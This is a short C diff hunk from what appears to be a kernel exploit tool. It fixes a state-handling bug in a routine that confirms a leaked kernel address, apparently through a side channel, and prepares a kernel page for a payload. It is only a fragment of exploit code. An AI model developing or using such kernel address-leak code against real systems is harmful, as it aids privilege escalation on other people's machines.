@@ -2352,11 +2352,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       uintptr_t confirmed_canonical =
           smart_mm_canonicalize(confirmed_mm);
       if (smart_mm_object_allowed(confirmed_canonical, payload_mode)) {
+        struct kernelsnitch_shared_state *confirmed_state = ks;
         kernelsnitch_cleanup(first_state);
         close(first_fd);
-        ks = first_state;
-        /* Restore the confirmed state as the active global state. */
-        (void)confirmed_canonical;
+        ks = confirmed_state;
         leaked = confirmed_canonical;
         final_hint_hit = 1;
         memfd_leak = confirm_fd;
